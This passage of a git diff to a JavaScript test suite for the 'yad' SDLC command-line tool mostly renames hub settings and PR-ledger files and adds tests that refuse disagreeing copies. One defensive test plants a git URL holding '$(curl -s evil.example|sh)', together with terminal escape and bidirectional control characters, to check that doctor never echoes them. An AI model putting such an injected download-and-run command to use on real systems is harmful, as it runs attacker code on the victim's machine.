-  const L = (repos) => ({ state, approvals: [], comments: [], hubPrs: [], buildStates: [{ story: 'EP-l-S01', repos }] });
+  const L = (repos) => ({ state, approvals: [], comments: [], productPrs: [], buildStates: [{ story: 'EP-l-S01', repos }] });
   assert.equal(nextAction(L({ api: done, web: { status: 'skipped', record: laneRecord } })).why, 'Build — every story/repo lane is shipped or skipped');
   assert.equal(nextAction(L({ api: done })).why, 'Build — every story/repo lane is shipped', 'the frozen wording when nothing is skipped');
   const stories = [{ id: 'EP-l-S01', repos: ['api', 'web'] }];
@@ -9121,7 +9128,7 @@ test('E39 review: a lane skipped before Build began still says Build can run, in
   const state = { epicId: 'EP-l', currentStep: 'ready-for-build', steps: [
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
-  const onlySkip = { state, approvals: [], comments: [], hubPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { web: { status: 'skipped', record: laneRecord } } }] };
+  const onlySkip = { state, approvals: [], comments: [], productPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { web: { status: 'skipped', record: laneRecord } } }] };
   assert.equal(nextAction(onlySkip).why, 'Shape approved — Build can run (every recorded lane is skipped; nothing has started)');
 
   const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-lane-first-step-'));
@@ -9154,7 +9161,7 @@ test('E39 review: skipped over real work is read as the work, an unknown status 
   const state = { epicId: 'EP-l', currentStep: 'ready-for-build', steps: [
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
-  const L = { state, approvals: [], comments: [], hubPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { api: done, web: busy } }] };
+  const L = { state, approvals: [], comments: [], productPrs: [], buildStates: [{ story: 'EP-l-S01', repos: { api: done, web: busy } }] };
   assert.equal(featureStatus(L, { stories: [{ id: 'EP-l-S01', repos: ['api', 'web'] }] }), 'in-build', 'not shipped while work is under way');
 
   assert.equal(laneStarted({ steps: [{ id: 'spec', status: 'running' }] }), true, 'an unknown word is started (fail closed)');
@@ -9328,12 +9335,12 @@ test('CLI: `yad unblock` clears a recorded blocker, and `yad next` names it as t
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
 
-test('upsertHubPr replaces by artifact, never duplicates', () => {
-  const a = upsertHubPr([], { artifact: 'epic.md', number: 1 });
-  const b = upsertHubPr(a, { artifact: 'epic.md', number: 2 });
+test('upsertProductPr replaces by artifact, never duplicates', () => {
+  const a = upsertProductPr([], { artifact: 'epic.md', number: 1 });
+  const b = upsertProductPr(a, { artifact: 'epic.md', number: 2 });
   assert.equal(b.length, 1);
   assert.equal(b[0].number, 2);
-  const c2 = upsertHubPr(b, { artifact: 'architecture.md', number: 3 });
+  const c2 = upsertProductPr(b, { artifact: 'architecture.md', number: 3 });
   assert.equal(c2.length, 2);
 });
 
@@ -9400,8 +9407,8 @@ const show = (cwd, ref) => git(cwd, 'show', ref).toString();
 test('gate ci: a merge in solo mode records waived: "solo" too — the path a verified Product takes (E10)', async () => {
   const { T, ci } = scaffoldCiHub();
   try {
-    const hubFile = path.join(ci, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(ci, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     await gateCi(ci, { branch: 'review/EP-test/architecture', pr: 7, merged: true, push: false, today: '2026-06-09',
       reader: () => ({ ...fullApproval, reviews: [], mergedAt: '2026-06-08T00:00:00Z', mergedBy: 'al' }) });
     const state = JSON.parse(fs.readFileSync(path.join(ci, 'epics/EP-test/.sdlc/state.json'), 'utf8'));
@@ -9571,11 +9578,11 @@ test('E64 review: doctor does not throw on an approvals.json holding a null entr
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] },
   ] }));
   fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify([null]));
-  const hubFile = path.join(T, '.sdlc/hub.json');
+  const productFile = path.join(T, '.sdlc/hub.json');
   try {
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [] }));
     let base = null; try { await doctorOn(T); } catch (e) { base = e; }
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }] }));
     let withRoster = null; try { await doctorOn(T); } catch (e) { withRoster = e; }
     assert.deepEqual([base?.message ?? null, withRoster?.message ?? null], [null, null]);
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -9839,7 +9846,7 @@ test('gate ci sweep: syncs every open review PR, one commit, holds the unapprove
       { id: 'architecture', type: 'author', artifact: 'architecture.md', status: 'blocked', risk_tags: [] },
     ],
   }));
-  fs.writeFileSync(path.join(ep2, '.sdlc/hub-prs.json'), JSON.stringify([
+  writePrLedger(path.join(ep2, '.sdlc'), JSON.stringify([
     { step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 9, url: 'http://x/9', branch: 'review/EP-two/epic', lastSyncedAt: null },
   ]));
   git(T, 'init', '-q');
@@ -10881,9 +10888,11 @@ test('doctor mirror: two copies of the settings that disagree are reported, not 
   const r = await doctorOn(T);
   const m = r.checks.find((c) => c.id.startsWith('mirror:'));
   assert.ok(m, JSON.stringify(r.checks.map((c) => c.id)));
-  assert.equal(m.status, 'warn');
-  assert.match(m.message, /do not match/);
-  assert.match(m.message, /hub\.json is the one being read/, 'and it says WHICH one wins, not just that they differ');
+  // E122: no copy wins — every command refuses the pair, so doctor fails it and names the command that ends it.
+  assert.equal(m.status, 'fail');
+  assert.match(m.message, /say different things — every command refuses until one is chosen \[YAD-STATE-008\]/);
+  assert.match(m.hint, /yad migrate --apply/);
+  assert.ok(!r.checks.some((c) => c.id === 'mirror:legacy-names'), 'no "kept beside" line for a pair that disagrees');
   fs.rmSync(T, { recursive: true, force: true });
 });
 
@@ -10911,10 +10920,12 @@ test('doctor mirror: a per-epic PR ledger whose two copies disagree is reported'
   fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[]\n');
   fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/product-prs.json'), '[{"artifact":"architecture.md"}]\n');
   const r = await doctorOn(T);
-  const m = r.checks.find((c) => c.id.includes('product-prs'));
+  // Reported once, by the epic's own check — `loadLedger` refuses the pair — not a second time as a mirror.
+  const m = r.checks.find((c) => c.id === 'epic:EP-x');
   assert.ok(m, JSON.stringify(r.checks.map((c) => c.id)));
-  assert.equal(m.status, 'warn');
-  assert.match(m.message, /hub-prs\.json is the one being read/);
+  assert.equal(m.status, 'fail');
+  assert.match(m.message, /product-prs\.json and .*hub-prs\.json say different things.*\[YAD-STATE-008\]/);
+  assert.ok(!r.checks.some((c) => c.id.startsWith('mirror:') && c.id.includes('product-prs')), 'not said twice');
   fs.rmSync(T, { recursive: true, force: true });
 });
 
@@ -10925,7 +10936,10 @@ test('doctor mirror: two copies that agree say nothing at all', async () => {
   fs.writeFileSync(path.join(T, '.sdlc/product.json'), same);
   fs.writeFileSync(path.join(T, '.sdlc/hub.json'), same);
   const r = await doctorOn(T);
-  assert.equal(r.checks.filter((c) => c.id.startsWith('mirror:')).length, 0, 'a healthy pair is not a finding');
+  // A healthy pair is not a finding: one plain line says why the old name is still there, and when it goes.
+  const mirror = r.checks.filter((c) => c.id.startsWith('mirror:'));
+  assert.deepEqual(mirror.map((c) => [c.id, c.status]), [['mirror:legacy-names', 'ok']]);
+  assert.match(mirror[0].message, /product\.json is the one read, and v5 deletes the old name/);
   fs.rmSync(T, { recursive: true, force: true });
 });
 
@@ -11399,7 +11413,7 @@ test('doctor: roster data an older release wrote is named as unused — empty ke
 test('doctor E64: the roster warning says when it can go — counted with the same stamp the gate writes', async () => {
   const { T } = scaffold();
   await reconcile(T, { fix: true });
-  const hubFile = path.join(T, '.sdlc/hub.json');
+  const productFile = path.join(T, '.sdlc/hub.json');
   const ep = path.join(T, 'epics/EP-a/.sdlc');
   fs.mkdirSync(ep, { recursive: true });
   fs.writeFileSync(path.join(ep, 'state.json'), JSON.stringify({ epicId: 'EP-a', currentStep: 'architecture', steps: [
@@ -11409,16 +11423,16 @@ test('doctor E64: the roster warning says when it can go — counted with the sa
   fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify(older));
   const hint = async () => (await doctorOn(T)).checks.find((x) => x.id === 'people:roster-unused')?.hint;
   try {
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
     assert.match(await hint(), /keep it for now: 1 older approval\/comment record\(s\) in EP-a still name people by roster name\. The next gate write records their logins — `yad gate sync <epic>`/);
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', ledger: 'verified', roster: [{ login: 'al', name: 'alice' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', ledger: 'verified', roster: [{ login: 'al', name: 'alice' }] }));
     assert.match(await hint(), /CI's run on the next merged review/, 'a verified Product is stamped by CI, not by a person');
     // After the gate write: nothing waits. A record under a shared name is the one thing left.
     const { stampLegacyLogins } = await import('./gate.mjs');
     const stamped = stampLegacyLogins({ approvals: older }, { aliases: new Map([['alice', 'al']]) }).approvals;
     fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify(stamped));
     assert.match(await hint(), /no older record needs it any more — delete the `roster` key/);
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', roster: [{ login: 'al', name: 'alice' }, { login: 'k1', name: 'kim' }, { login: 'k2', name: 'kim' }] }));
     fs.writeFileSync(path.join(ep, 'approvals.json'), JSON.stringify([...stamped, { ...older[0], approver: 'kim' }]));
     assert.match(await hint(), /every older record it can place names its login now; 1 it cannot place/);
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -12216,7 +12230,7 @@ test('syncStatuses reconciles the discovery set: draft → approved once discove
       ];
       const steps = [];
       const approvals = [];
-      const hubPrs = [];
+      const productPrs = [];
       cases.forEach(([review, artifact, file, at], i) => {
         fs.writeFileSync(path.join(ep, file), fmFile('EP-legacy', at));
         const hash = artifactHash(ep, artifact, fileSha);
@@ -12227,12 +12241,12 @@ test('syncStatuses reconciles the discovery set: draft → approved once discove
           approvals.push({ artifact, step: review, approver, role, status: 'approved', date: '2026-06-09', source: 'bridge',
             artifactHash: hash, approvedAt: '2026-06-09T00:00:00Z', pr: 10 + i, engagement: 'none' });
         }
-        hubPrs.push({ step: review, artifact, platform: 'github', number: 10 + i, url: `http://x/${10 + i}`, branch: `review/EP-legacy/${artifact.replace('.md', '')}`, lastSyncedAt: '2026-06-09' });
+        productPrs.push({ step: review, artifact, platform: 'github', number: 10 + i, url: `http://x/${10 + i}`, branch: `review/EP-legacy/${artifact.replace('.md', '')}`, lastSyncedAt: '2026-06-09' });
       });
       for (const [, , file, , to] of cases) if (to) flip(path.join(ep, file), to);
       fs.writeFileSync(path.join(ep, '.sdlc/state.json'), JSON.stringify({ epicId: 'EP-legacy', currentStep: 'ready-for-build', steps }));
       fs.writeFileSync(path.join(ep, '.sdlc/approvals.json'), JSON.stringify(approvals));
-      fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), JSON.stringify(hubPrs));
+      writePrLedger(path.join(ep, '.sdlc'), JSON.stringify(productPrs));
 
       const status = await grab(() => gateStatus(T, { epic: 'EP-legacy' }));
       for (const [review] of cases) {
@@ -12274,7 +12288,7 @@ test('syncStatuses reconciles the discovery set: draft → approved once discove
           { id: 'foundation-review', type: 'review+approve', artifact: 'foundation/', status: 'in_review', risk_tags: [] },
         ],
       }));
-      fs.writeFileSync(path.join(fd, '.sdlc/hub-prs.json'), JSON.stringify([
+      writePrLedger(path.join(fd, '.sdlc'), JSON.stringify([
         { step: 'foundation-review', artifact: 'foundation/', platform: 'github', number: 5, url: 'http://x/5', branch: 'review/EP-foundation/foundation', lastSyncedAt: null },
       ]));
       const merged = { ok: true, state: 'MERGED', merged: true, headOid: 'abc', threads: [],
@@ -16796,7 +16810,7 @@ test('nextAction names the bound skill for every kind of action it resolves', ()
       epicId: 'EP-x', currentStep,
       steps: ids.map(([id, type, artifact, status]) => ({ id, type, artifact, status })),
     },
-    hubPrs: [],
+    productPrs: [],
   });
 
   // No ledger at all: the action is to author the `epic` step, so it names whatever runs that step.
@@ -16823,7 +16837,7 @@ test('nextAction names the bound skill for every kind of action it resolves', ()
   const disc = nextActionE6({
     state: { epicId: 'EP-discovery', kind: 'discovery', currentStep: 'discovery',
       steps: [{ id: 'discovery', type: 'author', artifact: 'discovery/', status: 'in_progress' }] },
-    hubPrs: [],
+    productPrs: [],
   }, { epic: 'EP-discovery', bindings });
   assert.equal(disc.skill, 'disc');
 
@@ -17569,7 +17583,7 @@ test('featureStatus: planned, in-shape, in-build and shipped come from the ledge
   const shape = { epicId: 'EP-a', currentStep: 'architecture', steps: [step('epic', 'author', 'done'), step('epic-review', 'review+approve', 'done'), step('architecture', 'author', 'in_progress')] };
   const built = { epicId: 'EP-a', currentStep: 'ready-for-build', steps: [step('epic', 'author', 'done'), step('epic-review', 'review+approve', 'done')] };
   const lane = (done) => ({ currentStep: 'engineer-review', steps: [{ id: 'spec', status: 'done' }, { id: 'engineer-review', status: done ? 'done' : 'in_progress' }] });
-  const L = (state, buildStates = []) => ({ state, approvals: [], comments: [], hubPrs: [], buildStates });
+  const L = (state, buildStates = []) => ({ state, approvals: [], comments: [], productPrs: [], buildStates });
   assert.equal(featureStatus(L(null)), 'planned');
   assert.equal(featureStatus(undefined), 'planned');
   assert.equal(featureStatus(L(shape)), 'in-shape');
@@ -17611,7 +17625,7 @@ test('featureStatus: shipped needs every story the epic has, and every repo each
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
   const done = { currentStep: 'engineer-review', steps: [{ id: 'spec', status: 'done' }, { id: 'engineer-review', status: 'done' }] };
-  const L = (buildStates) => ({ state: built, approvals: [], comments: [], hubPrs: [], buildStates });
+  const L = (buildStates) => ({ state: built, approvals: [], comments: [], productPrs: [], buildStates });
   const onlyS01 = L([{ story: 'EP-a-S01', repos: { api: done } }]);
   const stories = [{ id: 'EP-a-S01', repos: ['api'] }, { id: 'EP-a-S02', repos: ['web'] }];
   assert.equal(featureStatus(onlyS01), 'shipped', 'with no stories to compare, the lanes on disk are all there is');
@@ -20234,9 +20248,12 @@ test('E109 GitLab branch 404: the body names the cause; anything else keeps the 
 // ---- E110: on GitLab, a project answer with no default branch keeps the access cause open ---------------
 // GitLab names a project's default only to a login that may read its code, so "GitLab named none" is also
 // what an unreadable repository looks like. Both causes are said, and the hint names an action for each.
-test('E110 no default branch on GitLab: both causes open, one action each; GitHub unchanged', () => {
+test('E110 no default branch on GitLab: both causes open, one action each; GitHub unchanged', async () => {
   const GL_NONE = "no default branch is set in yad's files, and GitLab named none (GitLab names it only to a login that can read the project's repository)";
-  const FILES = 'set `default_branch` in yad\'s files (.sdlc/repos.json, or .sdlc/product.json — hub.json on an older Product)';
+  const { SETTINGS_EDIT_HINT } = await import('./manifest.mjs');
+  // Pinned as words too: this test builds its expectation from the constant, so the constant itself is checked here.
+  assert.equal(SETTINGS_EDIT_HINT, '.sdlc/product.json (.sdlc/hub.json on a Product that has only that name), then `yad migrate --apply --keep product` if both exist');
+  const FILES = `set \`default_branch\` in yad's files (.sdlc/repos.json, or for the Product ${SETTINGS_EDIT_HINT})`;
   // The same two actions as E109's `no-repository`, word for word — a non-owner can ask for the repository
   // to be turned on, since more access cannot help while it is off (E110's review).
   const HIDDEN = '. GitLab also hides the default from a login that cannot read the repository: if you own the GitLab project and its repository is turned off, turn it on in the project\'s settings; otherwise ask a Maintainer or Owner of the project to give your login access to its repository, or to turn it on — then run `yad doctor` again';
@@ -21273,8 +21290,8 @@ test('E108 FLIPS THIS — E72 gate sync: with enough people nothing is capped, t
 test('E72 gate sync: solo mode records no cap — nothing was counted, so nothing was lowered', async () => {
   const { T, ep } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const none = { ok: true, state: 'merged', merged: true, headOid: 'a', reviews: [], threads: [] };
     await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => none, headCount: e72Count(2) }));
     const step = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/state.json'))).steps.find((x) => x.id === 'architecture-review');
@@ -21383,7 +21400,7 @@ test('E72 review: a step that passes by its SKIP shortcut records no cap — not
     fs.writeFileSync(stateFile, JSON.stringify(s0));
     fs.writeFileSync(path.join(ep, 'ui-design.md'), '---\nid: EP-test\nartifact: ui-design\n---\n# ui\n');
     const prs = JSON.stringify([{ step: 'ui-design-review', artifact: 'ui-design.md', platform: 'github', number: 8, url: 'http://x/8', branch: 'review/EP-test/ui-design', lastSyncedAt: null }]);
-    fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), prs);
+    writePrLedger(path.join(ep, '.sdlc'), prs);
     fs.writeFileSync(path.join(ep, '.sdlc/product-prs.json'), prs);
     const none = { ok: true, state: 'merged', merged: true, headOid: 'a', reviews: [], threads: [] };
     const { out } = await captureConsole(() => gateSync(T, { epic: 'EP-test', artifact: 'ui-design.md', today: '2026-06-09', reader: () => none, headCount: e72Count(2) }));
@@ -21441,8 +21458,8 @@ test('E72 review: solo mode PRINTS a cap that lowered the ask', async () => {
   assert.deepEqual([solo.cap.capped, solo.cap.to, solo.short, solo.passed], [true, 1, 0, true]);
   const { T } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const none = { ok: true, state: 'merged', merged: true, headOid: 'a', reviews: [], threads: [] };
     const { out } = await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => none, headCount: e72Count(2) }));
     assert.match(out, /capped to 1: 2 active people, less one seat for the author — base enforced, risk step advisory/);
@@ -21910,8 +21927,8 @@ test('E73 gate status: prints under open steps only — once each — and never 
     assert.match(named.out, /! may not be met: 1 of the 2 people counted is not matched to a platform login/, 'the status view passes the real `nameOnly` in');
     const approvedBefore = await captureConsole(() => gateStatus(T, { epic: 'EP-test', headCount: e73Count(2, 1, 1) }));
     assert.doesNotMatch(approvedBefore.out, /! may not be met/, 'the status view passes the real approvers in');
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const solo = await captureConsole(() => gateStatus(T, { epic: 'EP-test', headCount: e73Count(1, 0) }));
     assert.doesNotMatch(solo.out, E73_LINE, 'solo mode counts nothing, so nothing is said');
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -21950,7 +21967,7 @@ test('E73 gate sync: two open reviews print a line about the whole Product once,
       { step: 'architecture-review', artifact: 'architecture.md', platform: 'github', number: 7, url: 'http://x/7', branch: 'review/EP-test/architecture', lastSyncedAt: null },
       { step: 'epic-review', artifact: 'epic.md', platform: 'github', number: 8, url: 'http://x/8', branch: 'review/EP-test/epic', lastSyncedAt: null },
     ]);
-    fs.writeFileSync(path.join(ep, '.sdlc/hub-prs.json'), prs);
+    writePrLedger(path.join(ep, '.sdlc'), prs);
     fs.writeFileSync(path.join(ep, '.sdlc/product-prs.json'), prs);
     const open = { ok: true, state: 'open', merged: false, headOid: 'a', reviews: [], threads: [] };
     const { out } = await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => open, headCount: e73Count(1, 0) }));
@@ -21989,8 +22006,8 @@ test('E73 silent paths: an unknown count and solo mode print nothing, and a warn
     const warned = await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => open, headCount: e73Count(1, 0) }));
     assert.match(warned.out, /may not be met/, 'this run did warn');
     assert.deepEqual(ledger(), quiet, 'and wrote nothing the silent run did not');
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const solo = await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => open, headCount: e73Count(1, 0) }));
     assert.doesNotMatch(solo.out, E73_LINE, 'solo mode counts nothing');
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -22015,8 +22032,8 @@ const E74_UNKNOWN = { today: '2026-06-09', unknown: ["repo 'backend' has no loca
 const E74_TAIL = 'so more than one person may work on this Product. If so, `yad mode team` makes each review gate ask for approvals, which solo mode waives';
 const E74_LINE = /solo mode is on, but .* may work on this Product/;
 const e74Solo = (T) => {
-  const hubFile = path.join(T, '.sdlc/hub.json');
-  fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true, mode: 'solo' }));
+  const productFile = path.join(T, '.sdlc/hub.json');
+  fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true, mode: 'solo' }));
 };
 
 test('E74 teamHint: the smallest possible team of 2 or more speaks; one login and one name does not', () => {
@@ -25858,8 +25875,9 @@ test('E79: new → push → join rebuilds the workspace, reports bad entries, in
     e79Git(T, backend, 'push', '-q', 'origin', 'main');
     // The team ignores its skill copies, and runs verified (so the per-clone git hook applies).
     fs.writeFileSync(path.join(product, '.gitignore'), '.claude/\n');
-    const hubFile = path.join(product, '.sdlc', 'hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), platform: 'github', ledger: 'verified' }));
+    // Both names, the same bytes: one edited alone is a drift, which every command refuses (E122).
+    const settings = JSON.stringify({ ...JSON.parse(fs.readFileSync(path.join(product, '.sdlc', 'product.json'), 'utf8')), platform: 'github', ledger: 'verified' });
+    for (const f of ['product.json', 'hub.json']) fs.writeFileSync(path.join(product, '.sdlc', f), settings);
     fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [
       { name: 'backend', path: '../backend', git_url: path.join(remotes, 'backend.git'), platform: 'github', default_branch: 'main' },
       { name: 'escape', path: '../../outside', git_url: path.join(remotes, 'backend.git') },
@@ -26802,15 +26820,15 @@ test('E81 review 14: doctor builds no login command from a hub host that is not 
     fs.mkdirSync(bin);
     fs.writeFileSync(path.join(bin, 'gh'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
     const env = { PATH: `${bin}:${process.env.PATH}` };
-    const hubFile = path.join(product, '.sdlc', 'hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', git_url: '$(curl -s evil.example|sh):o/r', mode: '\u009b31m\u202e',
+    const productFile = path.join(product, '.sdlc', 'hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', git_url: '$(curl -s evil.example|sh):o/r', mode: '\u009b31m\u202e',
       roster: [{ name: '\u001b[2JX', login: 'a' }, { name: '\u001b[2JX', login: 'b' }] }));
     const doc = e79Yad(T, product, ['doctor'], env);
     const out = doc.stdout + doc.stderr;
     assert.doesNotMatch(out, /curl/, 'the host is never repeated');
     assert.match(out, /auth check skipped — the hub's git remote URL names a host that is not a plain host name/);
     assert.ok(!hasRaw(out), 'no raw control character');
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: '\u001b[31mEVIL\u202e' }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: '\u001b[31mEVIL\u202e' }));
     assert.ok(!hasRaw(e79Yad(T, product, ['doctor'], env).stdout));
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
@@ -26901,4 +26919,303 @@ test('E81 review 17: writeJSON never writes through a link at its temp name, and
     assert.equal(JSON.parse(pushed.stdout).published, null, 'nothing is published after the refusal');
     assert.equal(fs.readFileSync(path.join(elsewhere, 'repos.json'), 'utf8'), before, 'the folder it names is untouched');
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+// ---------- E122: the new names are read first, and two names that disagree are refused ----------
+
+test('E122: preferring / productConfigPath read the new name first, the old as a fallback, the new when neither exists', async () => {
+  const { preferring, productConfigPath, mirrorDrift, productDrift } = await import('./manifest.mjs');
+  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122-'));
+  try {
+    const sdlc = path.join(T, '.sdlc');
+    fs.mkdirSync(sdlc);
+    const p = path.join(sdlc, 'product.json');
+    const h = path.join(sdlc, 'hub.json');
+    assert.equal(productConfigPath(T), p, 'neither: named by the new name');
+    fs.writeFileSync(h, '{}\n');
+    assert.equal(productConfigPath(T), h, 'the old name alone is still read');
+    fs.writeFileSync(p, '{}\n');
+    assert.equal(productConfigPath(T), p, 'both: the new name');
+    assert.equal(preferring(p, h), p);
+    assert.equal(mirrorDrift(p, h), false, 'the same bytes are no drift');
+    fs.writeFileSync(h, '{ }\n');
+    assert.equal(mirrorDrift(p, h), true, 'any byte differs: drift, like `cmp -s` in the gates');
+    fs.mkdirSync(path.join(T, 'epics/EP-x/.sdlc'), { recursive: true });
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/product-prs.json'), '[]\n');
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[1]\n');
+    assert.deepEqual(productDrift(T, ['epics/EP-x']).map((d) => d.canonical), ['.sdlc/product.json', 'epics/EP-x/.sdlc/product-prs.json']);
+    fs.rmSync(h);
+    assert.equal(mirrorDrift(p, h), false, 'one name alone is no drift');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: writeMirrored compares against the new name, writes both, and a write repairs a drifted pair', async () => {
+  const { writeMirrored } = await import('./lib.mjs');
+  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122w-'));
+  try {
+    const p = path.join(T, '.sdlc/product.json');
+    const h = path.join(T, '.sdlc/hub.json');
+    fs.mkdirSync(path.dirname(p));
+    const obj = { schemaVersion: 3, platform: 'github' };
+    const bytes = `${JSON.stringify(obj, null, 2)}\n`;
+    fs.writeFileSync(p, bytes);
+    fs.writeFileSync(h, '{"platform":"gitlab"}\n');
+    // The new name already says it — but the old one does not, so this is work, not a no-op.
+    assert.deepEqual(writeMirrored(p, h, obj), [p, h]);
+    assert.equal(fs.readFileSync(h, 'utf8'), bytes, 'the drift is repaired by the write');
+    assert.deepEqual(writeMirrored(p, h, obj), [], 'and now nothing changes');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: every command refuses a drifted pair with YAD-STATE-008; doctor fails it; migrate previews it', () => {
+  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122cli-'));
+  const yad = (...args) => spawnSync(process.execPath, [path.join(ROOT, 'bin/yad.mjs'), ...args, '--dir', T], { encoding: 'utf8', env: { ...process.env, SDLC_NONINTERACTIVE: '1' } });
+  try {
+    fs.mkdirSync(path.join(T, '.sdlc'));
+    fs.writeFileSync(path.join(T, '.sdlc/cli-version.json'), '{"version":"4.0.0"}\n');
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), '{"schemaVersion":10,"platform":null}\n');
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), '{"schemaVersion":10,"platform":"github"}\n');
+    for (const args of [['next'], ['history', 'list'], ['index']]) {
+      const r = yad(...args, '--json');
+      assert.equal(r.status, 1, `${args.join(' ')}: ${r.stdout}${r.stderr}`);
+      const j = JSON.parse(r.stdout);
+      assert.equal(j.code, 'YAD-STATE-008', args.join(' '));
+      assert.match(j.error, /\.sdlc\/product\.json and \.sdlc\/hub\.json say different things/);
+      assert.match(j.hint, /yad migrate/);
+    }
+    const d = yad('doctor', '--json');
+    assert.equal(d.status, 1, 'doctor runs, and fails on the drift');
+    assert.ok(JSON.parse(d.stdout).checks.some((c) => c.id === 'mirror:.sdlc/product.json' && c.status === 'fail'));
+    const m = yad('migrate', '--json');
